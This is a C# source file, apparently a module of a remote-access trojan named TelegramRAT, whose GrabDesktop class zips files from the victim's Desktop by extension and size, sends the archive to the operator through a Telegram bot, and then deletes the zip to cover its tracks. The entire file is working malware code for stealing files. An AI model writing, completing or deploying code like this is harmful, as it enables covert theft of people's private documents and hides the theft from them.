using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;

namespace TelegramRAT;

internal class GrabDesktop
{
	public static void get()
	{
		telegram.sendText("\ud83d\udce6 Archiving desktop files...");
		string text = Path.GetDirectoryName(config.InstallPath) + "\\desktop.zip";
		IEnumerable<string> files = utils.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories);
		using (ZipArchive destination = ZipFile.Open(text, ZipArchiveMode.Create))
		{
			foreach (string item in files)
			{
				if (config.GrabFileTypes.Contains(Path.GetExtension(item)!.ToLower()) && config.GrabFileSize > new FileInfo(item).Length)
				{
					destination.CreateEntryFromFile(item, Path.GetFullPath(item));
				}
			}
		}
		telegram.sendFile(text);
		File.Delete(text);
	}
}
